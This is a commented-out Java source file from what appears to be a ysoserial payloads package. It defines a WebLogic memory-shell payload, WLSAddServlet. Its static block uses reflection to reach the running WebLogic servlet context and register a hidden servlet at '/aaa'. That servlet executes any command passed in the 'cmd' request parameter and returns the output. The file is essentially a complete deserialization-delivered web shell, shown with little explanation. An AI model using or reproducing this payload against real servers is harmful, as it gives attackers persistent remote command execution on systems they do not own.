//package ysoserial.payloads;
//
//
//import com.sun.org.apache.xalan.internal.xsltc.DOM;
//import com.sun.org.apache.xalan.internal.xsltc.TransletException;
//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
//import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
//import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
//import weblogic.servlet.internal.ServletStubImpl;
//import weblogic.servlet.internal.WebAppServletContext;
//import weblogic.servlet.utils.ServletMapping;
//
//import javax.servlet.*;
//import java.io.*;
//import java.lang.reflect.Constructor;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//
//public class WLSAddServlet extends AbstractTranslet implements Servlet {
//    static {
//        try {
//            String URI = "/aaa";
//            //获取context
//            Class executeThread = Class.forName("weblogic.work.ExecuteThread");
//            Method m = executeThread.getDeclaredMethod("getCurrentWork");
//            Object currentWork = m.invoke(Thread.currentThread());
//            Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
//            connectionHandlerF.setAccessible(true);
//            Object obj = connectionHandlerF.get(currentWork);
//
//            Field requestF = obj.getClass().getDeclaredField("request");
//            requestF.setAccessible(true);
//            obj = requestF.get(obj);
//            Field contextF = obj.getClass().getDeclaredField("context");
//            contextF.setAccessible(true);
//            Object context = contextF.get(obj);
//
//            // 获取servletMapping
//            Field field = context.getClass().getDeclaredField("servletMapping");
//            field.setAccessible(true);
//            ServletMapping mappings = (ServletMapping) field.get(context);
//
//            if (mappings.get(URI) == null) {
//                // 创建ServletStub
////                weblogic.servlet.internal.ServletStubImpl
//                Constructor<?> ServletStubImplConstructor = Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class);
//                ServletStubImplConstructor.setAccessible(true);
//                ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(URI, WLSAddServlet.class.newInstance(), context);
//
//                // 创建
//                Constructor<?> URLMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, ServletStubImpl.class);
//                URLMatchHelperConstructor.setAccessible(true);
//                Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub);
//
//                mappings.put(URI, umh);
//            }
////            }
//            System.out.println();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//    @Override
//    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
//
//    }
//
//    @Override
//    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
//
//    }
//
//    @Override
//    public void init(ServletConfig servletConfig) throws ServletException {
//
//    }
//
//    @Override
//    public ServletConfig getServletConfig() {
//        return null;
//    }
//
//    @Override
//    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
//        servletResponse.setContentType("text/html;charset=utf-8");
//        PrintWriter out = servletResponse.getWriter();
//
//        String cmd = servletRequest.getParameter("cmd");
//        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
//        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in, "GBK"));
//        String line = null;
//        while ((line = bufferedReader.readLine()) != null) {
//            out.print(line + "<br>");
//        }
//        out.print("add success1!!!");
//    }
//
//    @Override
//    public String getServletInfo() {
//        return null;
//    }
//
//    @Override
//    public void destroy() {
//
//    }
//
//}
